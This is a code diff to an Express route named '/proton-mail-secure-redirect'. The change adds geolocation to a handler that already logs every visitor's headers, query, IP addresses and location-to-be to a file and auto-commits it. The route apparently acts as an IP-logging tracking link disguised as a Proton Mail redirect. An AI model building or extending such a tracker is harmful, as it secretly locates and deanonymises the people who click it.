@@ -14,6 +14,9 @@ app.get("/proton-mail-secure-redirect", (req, res) => {
   
   // Console log
   console.log(entry);
+
+  // Geoloc 
+  var geo = geoip.lookup(ip);
   
   // Write to the log file
   fs.writeFileSync('log.txt', entry, { flag: 'a+' });
@@ -21,7 +24,8 @@ app.get("/proton-mail-secure-redirect", (req, res) => {
   // Log the full request 
   fs.writeFileSync('log.txt', JSON.stringify(req.headers) + "\n", { flag: 'a+' });
   fs.writeFileSync('log.txt', JSON.stringify(req.query) + "\n", { flag: 'a+' });
-  fs.writeFileSync('log.txt', JSON.stringify([req.ip, req.ips]) + "\n\n", { flag: 'a+' });
+  fs.writeFileSync('log.txt', JSON.stringify([req.ip, req.ips]) + "\n", { flag: 'a+' });
+  fs.writeFileSync('log.txt', JSON.stringify(geo) + "\n\n", { flag: 'a+' });
 
   // Auto-commit 
   sh.exec(`git commit -a -m 'auto-commit of log.txt'`);
